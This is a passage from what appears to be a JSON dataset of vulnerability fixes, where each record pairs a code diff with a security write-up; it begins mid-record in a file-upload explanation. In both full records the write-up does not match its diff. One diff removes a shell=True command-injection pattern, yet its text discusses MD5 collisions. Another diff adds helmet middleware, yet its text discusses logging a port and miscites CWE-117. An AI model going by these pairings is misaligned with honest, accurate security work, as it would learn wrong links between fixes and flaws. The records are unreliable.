Happens:\nThe vulnerability arises because the application does not sufficiently inspect the content of the uploaded file. It only checks the file extension and MIME type, both of which can be easily manipulated by an attacker. Additionally, the file is uploaded without any check for dangerous content or scripts, making the system vulnerable to file-based exploits.\n\nSecurity Implications:\nIf an attacker successfully uploads a malicious file, they could execute arbitrary code on the server. This could lead to a range of attacks, including:\n\nRemote Code Execution (RCE): Attacker could run arbitrary PHP or shell commands on the server.\n\nData Theft: Attacker could access sensitive data stored on the server.\n\nPrivilege Escalation: Attacker could escalate privileges or take control of the web server.\n\nDenial of Service (DoS): Attacker could overload the server or cause it to crash.\n\nSuggested Fix:\nRestrict File Types Strictly: Implement a comprehensive whitelist for allowed file types, ensuring that only specific, safe file types (such as images, PDFs) are allowed.\nSanitize File Names: Sanitize file names to avoid issues with special characters or malicious paths (e.g., .., /, etc.).\nLimit File Size: Implement file size restrictions to mitigate the risk of uploading large, malicious files that could overwhelm the server.\n"
    },
    "95": {
        "diff": "diff --git a/utils.py b/utils.py\n--- a/utils.py\n+++ b/utils.py\n@@ -1,5 +1,6 @@\n import subprocess\n from pathlib import Path\n+import shlex\n \n def get_directory_size(path: Path):\n     total = 0\n@@ -11,10 +12,10 @@\n def get_python_version(venv_path: Path, os_name: str) -> str:\n     if \"windows\" in os_name.lower():\n         python_exe = venv_path / \"Scripts\" / \"python.exe\"\n     else:\n         python_exe = venv_path / \"bin\" / \"python\"\n-    command = f'\"{python_exe}\" --version'\n-    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)\n+    command = [str(python_exe.resolve()), \"--version\"]\n+    output = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)\n     version_line = output.strip()\n     version = version_line.split()[1]\n     return version",
        "explanation": "Vulnerability Report (Line 190: CWE-916)\n\nRoot Cause:\nThe code uses the outdated MD5 algorithm to hash hook definitions for uniqueness. MD5 is cryptographically broken, extremely fast, and lacks collision resistance, making it unsuitable for any security-sensitive identifier generation.\n\nExploit Scenario:\nAn attacker could craft two distinct sets of form hooks whose string representations collide under MD5. By submitting specially constructed hook data, they force the same handle_submit_unique_name for both, enabling them to override or hijack legitimate form submit handlers.\n\nWhy It Happens:\nThe implementation blindly applies hashlib.md5(...).hexdigest() to arbitrary hook data without salting or using a stronger algorithm. Reliance on MD5\u2019s output for security-critical uniqueness violates modern cryptographic standards.\n\nSecurity Implications:\nSuccessful hash collisions allow an adversary to predict or duplicate handler names, enabling them to inject malicious logic into event callbacks, siphon form data, or bypass client-side controls\u2014effectively undermining application integrity.\n\nSuggested Fix:\nUse a secure hash function such as SHA-256 (e.g., hashlib.sha256) with a salt, or employ a random UUID (e.g., uuid.uuid4()) for unique handler names. Encapsulate hashing logic in a utility module to facilitate future algorithm upgrades."
    },
    "57": {
        "diff": "diff --git a/index.js b/index.js\nindex e4a261b..cc2f87d 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,5 +1,6 @@\n import express from \"express\";\n import bodyParser from \"body-parser\";\n+import helmet from \"helmet\";\n \n import usersRoutes from \"./routes/users.js\";\n \n@@ -7,6 +8,7 @@ const app = express();\n const PORT = 5000;\n \n app.use(bodyParser.json());\n+app.use(helmet());\n \n app.use(\"/people\", usersRoutes);\n app.get(\"/\", (req, res) => res.send(\"Welcome to the Users API!\"));",
        "explanation": "Vulnerability Type:\nCWE-117: Improper Output Neutralization for Logs\n\nProof of Concept:\nThis line in index.js is logging the IP and port information. \n\napp.listen(PORT, () => console.log(`Server running on port: http://localhost:${PORT}`));\n\nIn production, this can unintentionally expose internal network structure or server information to attackers with access to logs.\n\nRoot Cause:\nThe application directly logs the listening server address and port without considering the environment (development vs production). This results in leaking system details that should be hidden in production environments.\n\nExploit Scenario:\nAn attacker who gains access to production logs could see internal IP addresses, exposed ports, or service bindings. These details can then be used to plan internal attacks or find open services.\n\nWhy It Happens? \nThe server\u2019s startup code always outputs detailed system information without checking the execution context (development vs production), failing to neutralize sensitive data in logs.\n\nSecurity Implications\nLeakage of server address and port in production logs could help attackers perform lateral movement, open port scanning, network footprinting, and internal infrastructure mapping.\n\nSuggested Fix:\nControl logging behavior based on environment variables. In production, log only general success messages without exposing sensitive details like server IPs or ports."
    }
}